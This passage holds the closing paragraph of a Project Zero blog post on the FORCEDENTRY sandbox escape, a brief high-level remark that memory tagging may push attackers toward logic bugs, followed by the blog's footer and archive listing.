 <p class="YDzVciBUld-c4"><span>The advent of Memory Tagging Extensions (MTE), likely shipping in multiple consumer devices across the ARM ecosystem this year,</span><span>&nbsp;</span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://www.usenix.org/system/files/login/articles/login_summer19_03_serebryany.pdf">is a big step in the defense against memory corruption exploitation</a></span><span>. But attackers innovate too, and are likely already two steps ahead with a renewed focus on logic bugs. This sandbox escape exploit is likely a sign of the shift we can expect to see over the next few years if the promises of MTE can be delivered. And this exploit was far more extensible, reliable and generic than almost any memory corruption exploit could ever hope to be.</span></p>
<div style='clear: both;'></div>
</div>
<div class='post-footer'>
<div class='post-footer-line post-footer-line-1'>
<span class='post-author vcard'>
Posted by
<span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
<span itemprop='name'>Anonymous</span>
</span>
</span>
<span class='post-timestamp'>
at
<meta content='https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html' itemprop='url'/>
<a class='timestamp-link' href='https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html' rel='bookmark' title='permanent link'><abbr class='published' itemprop='datePublished' title='2022-03-31T09:00:00-07:00'>9:00&#8239;AM</abbr></a>
</span>
<span class='post-comment-link'>
</span>
<span class='post-icons'>
<span class='item-control blog-admin pid-145400864'>
<a href='https://draft.blogger.com/post-edit.g?blogID=4838136820032157985&postID=1353264177358891846&from=pencil' title='Edit Post'>
<img alt='' class='icon-action' height='18' src='https://resources.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
</a>
</span>
</span>
<div class='post-share-buttons goog-inline-block'>
<a class='goog-inline-block share-button sb-email' href='https://draft.blogger.com/share-post.g?blogID=4838136820032157985&postID=1353264177358891846&target=email' target='_blank' title='Email This'><span class='share-button-link-text'>Email This</span></a><a class='goog-inline-block share-button sb-blog' href='https://draft.blogger.com/share-post.g?blogID=4838136820032157985&postID=1353264177358891846&target=blog' onclick='window.open(this.href, "_blank", "height=270,width=475"); return false;' target='_blank' title='BlogThis!'><span class='share-button-link-text'>BlogThis!</span></a><a class='goog-inline-block share-button sb-twitter' href='https://draft.blogger.com/share-post.g?blogID=4838136820032157985&postID=1353264177358891846&target=twitter' target='_blank' title='Share to X'><span class='share-button-link-text'>Share to X</span></a><a class='goog-inline-block share-button sb-facebook' href='https://draft.blogger.com/share-post.g?blogID=4838136820032157985&postID=1353264177358891846&target=facebook' onclick='window.open(this.href, "_blank", "height=430,width=640"); return false;' target='_blank' title='Share to Facebook'><span class='share-button-link-text'>Share to Facebook</span></a><a class='goog-inline-block share-button sb-pinterest' href='https://draft.blogger.com/share-post.g?blogID=4838136820032157985&postID=1353264177358891846&target=pinterest' target='_blank' title='Share to Pinterest'><span class='share-button-link-text'>Share to Pinterest</span></a>
</div>
</div>
<div class='post-footer-line post-footer-line-2'>
<span class='post-labels'>
</span>
</div>
<div class='post-footer-line post-footer-line-3'>
<span class='post-location'>
</span>
</div>
</div>
</div>
<div class='comments' id='comments'>
<a name='comments'></a>
<h4>No comments:</h4>
<div id='Blog1_comments-block-wrapper'>
<dl class='avatar-comment-indent' id='comments-block'>
</dl>
</div>
<p class='comment-footer'>
<div class='comment-form'>
<a name='comment-form'></a>
<h4 id='comment-post-message'>Post a Comment</h4>
<p>
</p>
<a href='https://draft.blogger.com/comment/frame/4838136820032157985?po=1353264177358891846&hl=en' id='comment-editor-src'></a>
<iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410px' id='comment-editor' name='comment-editor' src='' width='100%'></iframe>
<script src='https://www.blogger.com/static/v1/jsbin/2315299244-comment_from_post_iframe.js' type='text/javascript'></script>
<script type='text/java                   '>
      BLOG_CMT_createIframe('https://draft.blogger.com/rpc_relay.html');
    </script>
</div>
</p>
</div>
</div>

        </div></div>
      
</div>
<div class='blog-pager' id='blog-pager'>
<span id='blog-pager-newer-link'>
<a class='blog-pager-newer-link' href='https://googleprojectzero.blogspot.com/2022/04/cve-2021-30737-xerubs-2021-ios-asn1.html' id='Blog1_blog-pager-newer-link' title='Newer Post'>Newer Post</a>
</span>
<span id='blog-pager-older-link'>
<a class='blog-pager-older-link' href='https://googleprojectzero.blogspot.com/2022/03/racing-against-clock-hitting-tiny.html' id='Blog1_blog-pager-older-link' title='Older Post'>Older Post</a>
</span>
<a class='home-link' href='https://googleprojectzero.blogspot.com/'>Home</a>
</div>
<div class='clear'></div>
<div class='post-feeds'>
<div class='feed-links'>
Subscribe to:
<a class='feed-link' href='https://googleprojectzero.blogspot.com/feeds/1353264177358891846/comments/default' target='_blank' type='application/atom+xml'>Post Comments (Atom)</a>
</div>
</div>
</div></div>
</div>
</div>
<div class='column-left-outer'>
<div class='column-left-inner'>
<aside>
</aside>
</div>
</div>
<div class='column-right-outer'>
<div class='column-right-inner'>
<aside>
<div class='sidebar section' id='sidebar-right-1'><div class='widget BlogSearch' data-version='1' id='BlogSearch1'>
<h2 class='title'>Search This Blog</h2>
<div class='widget-content'>
<div id='BlogSearch1_form'>
<form action='https://googleprojectzero.blogspot.com/search' class='gsc-search-box' target='_top'>
<table cellpadding='0' cellspacing='0' class='gsc-search-box'>
<tbody>
<tr>
<td class='gsc-input'>
<input autocomplete='off' class='gsc-input' name='q' size='10' title='search' type='text' value=''/>
</td>
<td class='gsc-search-button'>
<input class='gsc-search-button' title='search' type='submit' value='Search'/>
</td>
</tr>
</tbody>
</table>
</form>
</div>
</div>
<div class='clear'></div>
</div><div class='widget PageList' data-version='1' id='PageList1'>
<h2>Pages</h2>
<div class='widget-content'>
<ul>
<li>
<a href='https://googleprojectzero.blogspot.com/p/about-project-zero.html'>About Project Zero</a>
</li>
<li>
<a href='https://googleprojectzero.blogspot.com/p/working-at-project-zero.html'>Working at Project Zero</a>
</li>
<li>
<a href='https://googleprojectzero.blogspot.com/p/0day.html'>0day "In the Wild"</a>
</li>
<li>
<a href='https://googleprojectzero.github.io/0days-in-the-wild/rca.html'>0day Exploit Root Cause Analyses</a>
</li>
<li>
<a href='https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html'>Vulnerability Disclosure FAQ</a>
</li>
</ul>
<div class='clear'></div>
</div>
</div><div class='widget BlogArchive' data-version='1' id='BlogArchive1'>
<h2>Archives</h2>
<div class='widget-content'>
<div id='ArchiveList'>
<div id='BlogArchive1_ArchiveList'>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2024/'>
2024
</a>
<span class='post-count' dir='ltr'>(11)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2024/12/'>
December
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2024/11/'>
November
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2024/10/'>
October
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2024/06/'>
June
</a>
<span class='post-count' dir='ltr'>(3)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2024/04/'>
April
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2023/'>
2023
</a>
<span class='post-count' dir='ltr'>(11)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2023/11/'>
November
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2023/10/'>
October
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2023/09/'>
September
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2023/08/'>
August
</a>
<span class='post-count' dir='ltr'>(4)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2023/04/'>
April
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2023/03/'>
March
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2023/01/'>
January
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate expanded'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy toggle-open'>

        &#9660;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2022/'>
2022
</a>
<span class='post-count' dir='ltr'>(17)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2022/12/'>
December
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2022/11/'>
November
</a>
<span class='post-count' dir='ltr'>(3)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2022/10/'>
October
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2022/08/'>
August
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2022/06/'>
June
</a>
<span class='post-count' dir='ltr'>(3)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2022/05/'>
May
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2022/04/'>
April
</a>
<span class='post-count' dir='ltr'>(3)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate expanded'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy toggle-open'>

        &#9660;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2022/03/'>
March
</a>
<span class='post-count' dir='ltr'>(2)</span>
<ul class='posts'>
<li><a href='https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html'>FORCEDENTRY: Sandbox Escape</a></li>
<li><a href='https://googleprojectzero.blogspot.com/2022/03/racing-against-clock-hitting-tiny.html'>Racing against the clock -- hitting a tiny kernel ...</a></li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2022/02/'>
February
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2022/01/'>
January
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2021/'>
2021
</a>
<span class='post-count' dir='ltr'>(24)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2021/12/'>
December
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2021/10/'>
October
</a>
<span class='post-count' dir='ltr'>(3)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2021/09/'>
September
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2021/08/'>
August
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2021/06/'>
June
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2021/05/'>
May
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2021/04/'>
April
</a>
<span class='post-count' dir='ltr'>(3)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2021/03/'>
March
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2021/02/'>
February
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2021/01/'>
January
</a>
<span class='post-count' dir='ltr'>(10)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2020/'>
2020
</a>
<span class='post-count' dir='ltr'>(36)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2020/12/'>
December
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2020/11/'>
November
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2020/10/'>
October
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2020/09/'>
September
</a>
<span class='post-count' dir='ltr'>(4)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2020/08/'>
August
</a>
<span class='post-count' dir='ltr'>(5)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2020/07/'>
July
</a>
<span class='post-count' dir='ltr'>(8)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2020/06/'>
June
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2020/04/'>
April
</a>
<span class='post-count' dir='ltr'>(3)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2020/02/'>
February
</a>
<span class='post-count' dir='ltr'>(4)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2020/01/'>
January
</a>
<span class='post-count' dir='ltr'>(5)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2019/'>
2019
</a>
<span class='post-count' dir='ltr'>(27)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2019/12/'>
December
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2019/11/'>
November
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2019/10/'>
October
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2019/09/'>
September
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2019/08/'>
August
</a>
<span class='post-count' dir='ltr'>(11)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2019/05/'>
May
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2019/04/'>
April
</a>
<span class='post-count' dir='ltr'>(3)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2019/03/'>
March
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2019/02/'>
February
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2019/01/'>
January
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2018/'>
2018
</a>
<span class='post-count' dir='ltr'>(22)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2018/12/'>
December
</a>
<span class='post-count' dir='ltr'>(7)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2018/11/'>
November
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2018/10/'>
October
</a>
<span class='post-count' dir='ltr'>(4)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2018/09/'>
September
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2018/08/'>
August
</a>
<span class='post-count' dir='ltr'>(3)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2018/07/'>
July
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2018/06/'>
June
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2018/05/'>
May
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2018/04/'>
April
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2018/01/'>
January
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2017/'>
2017
</a>
<span class='post-count' dir='ltr'>(19)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2017/12/'>
December
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2017/10/'>
October
</a>
<span class='post-count' dir='ltr'>(3)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2017/09/'>
September
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2017/08/'>
August
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2017/07/'>
July
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
